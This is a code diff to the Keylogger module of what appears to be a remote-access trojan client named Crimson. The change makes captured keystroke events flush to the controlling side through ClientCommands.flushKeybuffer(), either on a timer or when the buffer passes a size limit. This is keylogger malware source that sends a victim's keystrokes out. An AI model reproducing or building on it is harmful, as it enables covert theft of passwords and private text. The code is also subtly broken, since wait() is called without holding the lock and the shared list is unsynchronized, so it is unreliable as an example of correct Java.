@@ -17,13 +17,13 @@
  *****************************************************************************/
 package com.subterranean_security.crimson.client.modules;
 
-import java.util.concurrent.ArrayBlockingQueue;
-import java.util.concurrent.BlockingQueue;
+import java.util.ArrayList;
 
 import org.slf4j.Logger;
 import org.slf4j.LoggerFactory;
 
-import com.subterranean_security.crimson.core.proto.Keylogger.KEvent;
+import com.subterranean_security.crimson.client.net.ClientCommands;
+import com.subterranean_security.crimson.core.proto.Keylogger.EV_KEvent;
 
 public enum Keylogger {
 	;
@@ -31,19 +31,39 @@ public enum Keylogger {
 
 	private static Thread monitor;
 
-	public static BlockingQueue<KEvent> buffer = new ArrayBlockingQueue<KEvent>(512);
+	// dont forget to notify this buffer when using event method
+	public static ArrayList<EV_KEvent> buffer = new ArrayList<EV_KEvent>(4096);
 
-	public static void start() {
+	public static void start(RefreshMethod method, int value) {
 		stop();
 		log.info("Starting keylogger");
 		monitor = new Thread(new Runnable() {
 			public void run() {
-				KEvent k;
+				EV_KEvent k;
 				try {
-					while (!monitor.isInterrupted()) {
-						k = buffer.take();
-						log.info("Dropping key event: " + k.getEvent());
+					switch (method) {
+					case EVENT:
+						while (!monitor.isInterrupted()) {
+							// wait for an event
+							buffer.wait();
+							if (buffer.size() > value) {
+								ClientCommands.flushKeybuffer();
+							}
+
+						}
+						break;
+					case TIME:
+						while (!monitor.isInterrupted()) {
+							Thread.sleep(value);
+							ClientCommands.flushKeybuffer();
+
+						}
+						break;
+					default:
+						break;
+
 					}
+
 				} catch (InterruptedException e) {
 					log.info("Exited monitoring thread");
 				}
@@ -64,6 +84,10 @@ public enum Keylogger {
 
 	public static boolean isLogging() {
 		return monitor == null ? false : monitor.isAlive();
+	}
+
+	public enum RefreshMethod {
+		TIME, EVENT;
 	}
 
 }
